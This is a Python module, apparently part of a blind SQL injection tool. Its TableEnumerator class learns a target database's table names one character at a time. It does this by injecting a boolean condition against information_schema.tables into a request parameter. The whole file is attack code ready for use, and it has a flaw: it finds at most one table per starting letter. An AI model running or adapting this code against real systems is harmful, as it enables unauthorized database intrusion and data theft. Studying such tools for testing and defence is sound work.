from typing import List
from .base_injector import BaseInjector
from .config import Config

class TableEnumerator(BaseInjector):
    def __init__(self, config: Config):
        super().__init__(config)
        
    def enumerate_tables(self) -> List[str]:
        """Enumerate all table names in the database."""
        tables = []
        current_index = 0
        
        while current_index < len(self.alphabet):
            def check_table_prefix(prefix: str) -> bool:
                payload = f"tom' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE '{prefix}%') > 0 -- "
                return self._make_request(payload)
                
            # Try to find a table starting with the current letter
            table_name = None
            for char in self.alphabet[current_index:]:
                if check_table_prefix(char):
                    # Found a table starting with this character, now get the full name
                    table_name = self._enumerate_string(check_table_prefix, prefix=char)
                    if table_name:
                        tables.append(table_name)
                        print(f"Found table: {table_name}")
                        current_index = self.alphabet.index(table_name[0]) + 1
                        break
                        
            if not table_name:
                # No more tables found starting with remaining letters
                break
                
        return tables
